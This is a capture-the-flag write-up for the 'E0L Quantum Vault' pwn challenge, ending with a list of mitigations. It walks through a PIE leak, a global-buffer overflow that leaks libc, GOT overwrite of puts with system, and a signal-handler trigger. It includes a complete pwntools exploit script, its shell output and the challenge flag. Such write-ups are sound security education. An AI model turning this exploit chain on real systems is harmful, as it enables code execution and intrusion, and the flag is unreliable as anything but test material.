# E0L Quantum Vault - CTF Writeup

**Challenge Name:** E0L Quantum Vault
**Category:** PWN
**Difficulty:** Medium
**Flag:** `CYNX{E0L_d0ubl3_wr1t3_s1gn4l_h4ndl3r_pwn}`

---

## Challenge Description

After the CYNX HQ breach, investigators discovered that E0L (one of 0nyX's elite operatives) left behind a sophisticated "Quantum Vault". It speaks of a high-security verification system that was being tested on CYNX infrastructure. The vault contains encrypted logs of their operations, but E0L was arrogant enough to leave the vault binary itself as a taunt.

**Files provided:**
- `quantum_vault` - Challenge binary
- `libc.so.6` - GLIBC 2.35 (Ubuntu)
- `ld-linux-x86-64.so.2` - Dynamic linker

---

## Initial Reconnaissance

### Setting Up the Environment

First, I used `pwninit` to patch the binary with the provided libc and linker:

```bash
$ pwninit
bin: ./quantum_vault
libc: ./libc.so.6
ld: ./ld-linux-x86-64.so.2

setting ./ld-linux-x86-64.so.2 executable
copying ./quantum_vault to ./quantum_vault_patched
running patchelf on ./quantum_vault_patched
writing solve.py stub
```

### Binary Information

```bash
$ file quantum_vault_patched
quantum_vault_patched: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

### Security Protections

```bash
$ checksec quantum_vault_patched
[*] '/home/xuan/cynx2026/E0L_Quantum_Vault/quantum_vault_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**Key observations:**
- ✅ **PIE enabled** - Need address leak
- ✅ **NX enabled** - Stack not executable, need ROP or GOT hijack
- ⚠️ **Partial RELRO** - GOT is writable
- ❌ **No stack canary** - Buffer overflows are possible

### Running the Binary

```bash
$ ./quantum_vault_patched
╔════════════════════════════════════════════╗
║   E0L's Quantum Vault - Security System   ║
║        0nyX Syndicate Technology          ║
╚════════════════════════════════════════════╝

[*] Vault Instance ID: 0x5634bae8256f

[*] Enter Quantum Identity Key: test
[*] Verifying quantum coherence [OK]
[*] System Status: System Normal

[*] Quantum State Adjustment Interface
[*] Target Address (hex): 0x1234
[*] Target Value (hex): 0x5678
[*] Writing 0x5678 to 0x1234
[Segmentation fault]
```

**Initial observations:**
1. Program leaks a "Vault Instance ID" which looks like a code address
2. Asks for a "Quantum Identity Key"
3. Provides an "arbitrary write primitive" - can write any value to any address!
4. Program crashes after the write

---

## Static Analysis with Ghidra

I loaded the binary into Ghidra and analyzed the key functions.

### Function: `setup()` at 0x1014d0

```c
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  config_ptr = "System Normal";
  alarm_message = "Session terminated - Quantum coherence collapsed";
  signal(SIGALRM, session_timeout);  // Register signal handler
  alarm(10);                          // 10-second timeout
}
```

**Key finding:** The program sets a 10-second alarm that will trigger `session_timeout()`.

### Function: `main()` at 0x10156f

```c
void main(void) {
  setup();

  // Print banner and LEAK PIE ADDRESS
  printf("[*] Vault Instance ID: 0x%lx\n", main);  // ⚠️ PIE LEAK!

  // Read identity key
  printf("[*] Enter Quantum Identity Key: ");
  read_identity(user_buffer, 0x40);  // Read 64 bytes
  verify_quantum_state();

  // Print status
  printf("[*] System Status: ");
  puts(config_ptr);

  // ARBITRARY WRITE #1
  printf("[*] Target Address (hex): ");
  fgets(local_38, 0x20, stdin);
  local_10 = strtoul(local_38, NULL, 16);

  printf("[*] Target Value (hex): ");
  fgets(local_38, 0x20, stdin);
  local_18 = strtoul(local_38, NULL, 16);

  *local_10 = local_18;  // Write value to address

  // ARBITRARY WRITE #2 (same pattern)
  // ... repeats ...
  *local_10 = local_18;

  // Infinite loop
  while(1) {
    for(i=0; i<1000000; i++);
  }
}
```

**Critical findings:**
1. **PIE leak:** `main` address is leaked → can calculate binary base
2. **Two arbitrary writes:** Can write any 8-byte value to any address
3. **Infinite loop at end:** No way to return or call functions directly
4. **Signal handler:** The alarm will trigger after 10 seconds!

### Function: `read_identity()` at 0x101332

```c
void read_identity(long param_1, int param_2) {
  int iVar1;
  int local_c = 0;

  while (local_c < param_2) {
    iVar1 = getchar();
    if ((iVar1 == '\n') || (iVar1 == EOF)) break;
    *(char *)(param_1 + local_c) = (char)iVar1;
    local_c++;
  }
  *(char *)(param_1 + local_c) = '\0';
}
```

Custom input function using `getchar()` in a loop.

### Function: `session_timeout()` at 0x10130a

```c
void session_timeout(int signum, int param_2) {
  puts(alarm_message);
  exit(-1);
}
```

**Key insight:** When alarm triggers, this calls `puts(alarm_message)` then `exit()`.

### Function: `admin_debug_shell()` at 0x1012e9

```c
void admin_debug_shell(void) {
  puts("Access Denied: Unauthorized function call detected");
  exit(-1);
}
```

This looks like a potential win function but it just exits immediately. It's a red herring!

---

## Vulnerability Discovery

### Checking Symbol Table

```bash
$ nm quantum_vault_patched | grep " B "
00000000000040a0 B stdout
00000000000040b0 B stdin
00000000000040c0 B stderr
00000000000040c8 b completed.0
00000000000040e0 B user_buffer
00000000000040f8 B _end
0000000000004100 B config_ptr
0000000000004108 B alarm_message
```

### Memory Layout Analysis

```bash
$ readelf -s quantum_vault_patched | grep "user_buffer\|config_ptr\|alarm_message"
    47: 00000000000040e0    32 OBJECT  GLOBAL DEFAULT   19 user_buffer
    27: 0000000000004100     8 OBJECT  GLOBAL DEFAULT   19 config_ptr
    55: 0000000000004108     8 OBJECT  GLOBAL DEFAULT   19 alarm_message
```

**Critical vulnerability discovered:**

```
0x40e0 - 0x40ff: user_buffer[32]     ← Only 32 bytes!
0x4100 - 0x4107: config_ptr          ← Immediately after
0x4108 - 0x410f: alarm_message       ← Next
```

But in `main()`:
```c
read_identity(user_buffer, 0x40);  // Tries to read 64 bytes into 32-byte buffer!
```

**Buffer overflow vulnerability:** We can overflow `user_buffer` to overwrite `config_ptr` and `alarm_message`!

---

## Exploitation Strategy

### The Plan

1. **Leak PIE base** from the Vault Instance ID
2. **Leak libc base** by overflowing `config_ptr` with a GOT address
3. **Use arbitrary write #1** to overwrite `alarm_message` with `/bin/sh` address
4. **Use arbitrary write #2** to overwrite `puts@GOT` with `system` address
5. **Wait for alarm** to trigger `session_timeout()` which calls `puts(alarm_message)` → becomes `system("/bin/sh")`

### Why This Works

When the alarm triggers after 10 seconds:
```c
session_timeout() {
  puts(alarm_message);  // If alarm_message points to "/bin/sh"
                        // and puts@GOT points to system
                        // This becomes: system("/bin/sh")
  exit(-1);
}
```

---

## Exploit Development

### Step 1: Calculate Offsets

```bash
$ readelf -s quantum_vault_patched | grep " main"
    74: 000000000000156f   653 FUNC    GLOBAL DEFAULT   10 main

$ readelf -r quantum_vault_patched | grep "puts\|exit"
000000004018  R_X86_64_JUMP_SLO  puts@GLIBC_2.2.5
000000004080  R_X86_64_JUMP_SLO  exit@GLIBC_2.2.5
```

Offsets from binary base:
- `main`: `0x156f`
- `puts@GOT`: `0x4018`
- `user_buffer`: `0x40e0`
- `config_ptr`: `0x4100`
- `alarm_message`: `0x4108`

### Step 2: Find libc Offsets

```bash
$ readelf -s libc.so.6 | grep " puts"
   426: 0000000000080e50   512 FUNC    GLOBAL DEFAULT   15 puts

$ readelf -s libc.so.6 | grep " system"
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system

$ strings -a -t x libc.so.6 | grep "/bin/sh"
 1d8678 /bin/sh
```

### Step 3: Writing the Exploit

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./quantum_vault_patched')
libc = ELF('./libc.so.6')

p = process('./quantum_vault_patched')
#p = remote('localhost', 10000)

# 1. Leak PIE
p.recvuntil(b'Vault Instance ID: 0x')
main_leak = int(p.recvline().strip(), 16)
pie_base = main_leak - 0x156f
log.success(f"PIE base: {hex(pie_base)}")

# 2. Calculate addresses
user_buffer = pie_base + 0x40e0
config_ptr_addr = pie_base + 0x4100
alarm_message_addr = pie_base + 0x4108
puts_got = pie_base + 0x4018

# 3. Overflow to leak libc
payload = b"A" * 32  # Fill user_buffer
payload += p64(puts_got)  # Overwrite config_ptr with puts@GOT

p.sendlineafter(b'Key: ', payload)
p.recvuntil(b'Status: ')

# 4. Parse libc leak
libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = libc_leak - 0x80e50
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"System: {hex(system)}")
log.success(f"/bin/sh: {hex(binsh)}")

# 5. Write #1: alarm_message → /bin/sh in libc
p.sendlineafter(b'hex): ', hex(alarm_message_addr).encode())
p.sendlineafter(b'hex): ', hex(binsh).encode())

# 6. Write #2: puts@GOT → system
p.sendlineafter(b'hex): ', hex(puts_got).encode())
p.sendlineafter(b'hex): ', hex(system).encode())

# 7. Trigger via alarm
log.info("Waiting for shell (10s alarm)...")
p.interactive()
```

---

## Getting the Flag

```bash
$ python3 exploit.py
[*] '/home/xuan/cynx2026/E0L_Quantum_Vault/quantum_vault_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to localhost on port 10000: Done
[+] PIE base: 0x55c2eca43000
[+] Libc base: 0x7f1ae55e2000
[+] System: 0x7f1ae5632d70
[+] /bin/sh: 0x7f1ae57ba678
[*] Waiting for shell (10s alarm)...
[*] Switching to interactive mode
$ ls
flag.txt
quantum_vault
$ cat flag.txt
CYNX{E0L_d0ubl3_wr1t3_s1gn4l_h4ndl3r_pwn}
$
```

**Flag:** `CYNX{E0L_d0ubl3_wr1t3_s1gn4l_h4ndl3r_pwn}`

---

## Technical Deep Dive

### Vulnerability Chain

1. **Information Leak (PIE Defeat)**
   - The program leaks `main` address directly in the banner
   - Calculate binary base: `pie_base = main_leak - 0x156f`

2. **Buffer Overflow (Libc Leak)**
   - `user_buffer` is 32 bytes but `read_identity()` reads up to 64 bytes
   - Overwrite `config_ptr` (8 bytes after buffer) with `puts@GOT` address
   - When `puts(config_ptr)` executes, it prints the GOT entry containing libc address
   - Calculate libc base: `libc_base = puts_leak - puts_offset`

3. **Arbitrary Write Primitive**
   - Program provides two arbitrary 8-byte writes
   - No validation on addresses or values
   - Can write anywhere in memory

4. **GOT Hijacking**
   - Partial RELRO means GOT is writable
   - Overwrite `puts@GOT` with `system` address
   - Any future `puts()` call becomes `system()` call

5. **Signal Handler Exploitation**
   - Program sets 10-second alarm that triggers `session_timeout()`
   - `session_timeout()` calls `puts(alarm_message)` then `exit()`
   - By controlling both `alarm_message` (points to "/bin/sh") and `puts@GOT` (points to system)
   - We turn `puts(alarm_message)` into `system("/bin/sh")`

### Why Not Use `admin_debug_shell()`?

The `admin_debug_shell()` function looks like a win function but:
```c
void admin_debug_shell(void) {
  puts("Access Denied...");
  exit(-1);  // Immediately exits, no shell
}
```

It's a red herring - just prints an error and exits. The real win condition is hijacking the signal handler execution flow.

---

## Key Takeaways

1. **Custom input functions** can hide buffer overflows - always check buffer sizes against read sizes
2. **Global variable layout** matters - adjacent globals can be overflow targets
3. **Signal handlers** provide alternative execution paths even in infinite loops
4. **Partial RELRO** makes GOT hijacking viable
5. **Arbitrary write primitives** are powerful when combined with leaked addresses

---

## Mitigation Recommendations

1. Enable **Full RELRO** to make GOT read-only
2. Enable **stack canaries** to detect buffer overflows
3. Fix buffer overflow by allocating proper size: `char user_buffer[64]`
4. Validate addresses and values in the "quantum state adjustment" interface
5. Don't leak code addresses (remove the PIE leak)
6. Use secure input functions like `fgets()` with proper bounds checking

---

## References

- GLIBC 2.35 Source: https://sourceware.org/git/?p=glibc.git;a=summary
- GOT/PLT Internals: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
- Signal Handler Exploitation: https://www.exploit-db.com/papers/13243

---

**Author:** xuan
**Date:** 2026-01-19
**Challenge Rating:** Medium - Requires understanding of memory layout, GOT hijacking, and creative use of signal handlers
